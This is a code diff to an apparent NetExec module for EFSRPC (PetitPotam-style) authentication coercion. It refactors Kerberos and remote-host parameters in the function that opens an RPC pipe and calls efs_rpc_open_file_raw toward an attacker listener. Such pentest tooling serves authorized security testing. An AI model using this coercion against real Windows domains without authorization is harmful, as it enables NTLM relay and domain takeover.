@@ -44,11 +44,11 @@ class NXCModule:
             lmhash=connection.lmhash,
             nthash=connection.nthash,
             aesKey=connection.aesKey,
-            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
+            target=connection.host if not connection.kerberos else connection.remoteName,
             pipe=self.pipe,
             do_kerberos=connection.kerberos,
-            dc_host=connection.kdcHost,
-            target_ip=connection.host,
+            kdcHost=connection.kdcHost,
+            remoteHost=connection.host,
             context=context,
         )
         if efs_rpc_open_file_raw(dce, self.listener, context):
@@ -194,8 +194,8 @@ def coerce(
     target,
     pipe,
     do_kerberos,
-    dc_host,
-    target_ip=None,
+    kdcHost,
+    remoteHost,
     context=None,
 ):
     binding_params = {
@@ -221,6 +221,7 @@ def coerce(
         },
     }
     rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
+    rpc_transport.setRemoteHost(remoteHost)
     if hasattr(rpc_transport, "set_credentials"):
         rpc_transport.set_credentials(
             username=username,
@@ -231,15 +232,12 @@ def coerce(
             aesKey=aesKey,
         )
 
-    if target_ip:
-        rpc_transport.setRemoteHost(target_ip)
-
     dce = rpc_transport.get_dce_rpc()
     dce.set_auth_type(RPC_C_AUTHN_WINNT)
     dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
     if do_kerberos:
-        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)
+        rpc_transport.set_kerberos(do_kerberos, kdcHost)
         dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
     context.log.info(f"[-] Connecting to {binding_params[pipe]['stringBinding']}")
